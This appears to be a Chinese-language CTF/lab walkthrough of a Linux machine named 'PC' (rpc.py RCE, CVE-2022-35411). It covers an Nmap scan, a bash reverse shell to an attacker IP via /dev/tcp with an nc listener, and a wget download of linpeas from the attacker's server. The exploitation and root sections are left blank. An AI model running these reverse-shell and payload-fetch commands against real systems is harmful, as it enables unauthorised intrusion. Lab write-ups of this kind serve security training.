---
description: Linux / 中等难度 / rpc.py 0.6.0 RCE
---

# ✔️ PC

## 建立立足点

### 信息收集

* 使用Nmap对目标开放端口进行扫描，发现2个开放端口：22和8000

<figure><img src="../.gitbook/assets/1 (4).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

* 从Nmap扫描结果也可直接得知，发现8000端口就是一个终端：

<figure><img src="../.gitbook/assets/2 (4).png" alt=""><figcaption></figcaption></figure>

* 将shell回连到自己的Kaili机器上，方便后续操作：

```bash
# Kali
nc -lvnp 5555
# 目标主机
sh -i >& /dev/tcp/192.168.45.154/5555 0>&1
```

<figure><img src="../.gitbook/assets/3 (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/4 (5).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 传linpeas.sh到目标系统进行信息收集：

```bash
# Kali目录下开启服务器
pyhton3 -m http.server 8888
# 目标主机
wget http://192.168.45.154:8888/linpeas.sh /home/user/linpeas.sh
```

<figure><img src="../.gitbook/assets/5 (5).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
关于linpeas所收集到的可能可被利用的CVE漏洞是具有参考意义的，但并非每次都能成功作用于当前的目标系统，还需要结合目标系统实际的具体情况，仔细查看各项输出信息，再做判断。（兔子洞很容易出现在这个阶段，就像）
{% endhint %}

* 本例中，从linpeas的输出信息可得知还有两个活动的开放端口（53和65432）是之前Nmap阶段并没有扫描出来的，因此可以重点关注一下：

<figure><img src="../.gitbook/assets/6 (5).png" alt=""><figcaption></figcaption></figure>

*









### 漏洞查阅







### 漏洞利用







### ROOT







{% hint style="info" %}
本例以为又是一个评级过高的简单机器，因为该机器并没有GET SHELL的过程。在之后的提权阶段需要涉及到反向端口转发和仔细的进行信息枚举，才能发现可被利用的漏洞。

CVE-2022-35411
{% endhint %}
